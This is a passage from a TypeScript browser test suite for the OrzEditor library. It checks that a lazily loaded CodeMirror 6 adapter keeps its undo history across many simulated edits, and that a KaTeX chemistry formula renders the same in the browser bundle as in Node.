      const E = (window as unknown as { OrzEditor: Record<string, (...a: unknown[]) => unknown> }).OrzEditor;
      const w = window as unknown as Record<string, unknown>;
      let open!: () => void;
      const gate = new Promise<void>((r) => { open = r; });
      w.__open = open;
      w.shell_c = E.createEditorShell(document.getElementById('c'), { text, mode: 'editor', render: () => '', hooks: { save: () => Promise.resolve() },
        adapter: E.codemirror6Adapter({ loadModules: async () => { await gate; return w.OrzCodeMirror6; } }), preview: { assets: false } });
    }, big);
    const states = await p.evaluate((n) => {
      const w = window as unknown as Record<string, { root: ShadowRoot; getText(): string }>;
      const ta = w.shell_c.root.querySelector('textarea')!;
      const real = Date.now;
      let fake = real();
      Date.now = () => (fake += 1000); // every input its own undo step
      const out: string[] = [];
      for (let i = 0; i < n; i++) {
        const v = ta.value;
        const at = 1000 + ((i * 7919) % (v.length - 2000));
        ta.value = v.slice(0, at) + v.slice(at + 5);
        ta.setSelectionRange(at, at);
        ta.dispatchEvent(new InputEvent('input', { inputType: 'deleteContentBackward', bubbles: true }));
        if (i >= n - 3) out.push(w.shell_c.getText());
      }
      Date.now = real;
      return out;
    }, 200);
    const r = await p.evaluate(async () => {
      const w = window as unknown as Record<string, unknown> & { shell_c: { ready: Promise<{ engine: string }>; adapter: { name: string } } };
      const t0 = performance.now();
      (w.__open as () => void)();
      const ready = await w.shell_c.ready;
      return { engine: ready.engine, ms: performance.now() - t0 };
    });
    expect(r.engine).toBe('codemirror6');
    expect(r.ms).toBeLessThan(4000);
    expect(await p.evaluate('shell_c.getText() === ' + JSON.stringify(states[2]))).toBe(true);
    expect(await p.evaluate('[shell_c.undo(), shell_c.getText() === ' + JSON.stringify(states[1]) + ', shell_c.undo(), shell_c.getText() === ' + JSON.stringify(states[0]) + ']')).toEqual([true, true, true, true]);
    expect(await p.evaluate('(function () { var n = 2; while (shell_c.undo() && n < 500) n++; return n; })()')).toBe(100);
    await p.close();
  }, 90_000);

  it('[E.13] [E.10] the test bundle renders \\ce with the one KaTeX the shipped CommonJS build uses (mhchem registered on the copy that renders)', async () => {
    const p = await open();
    const html = await p.evaluate('OrzEditor.renderMarkdownPreview("$\\\\ce{H2O}$")') as string;
    expect(html).toContain('class="katex"');
    expect(html).not.toContain('katex-error');
    expect(html).toBe(renderMarkdownPreview('$\\ce{H2O}$')); // what Node (and the CommonJS build) renders
    await p.close();
  });
});
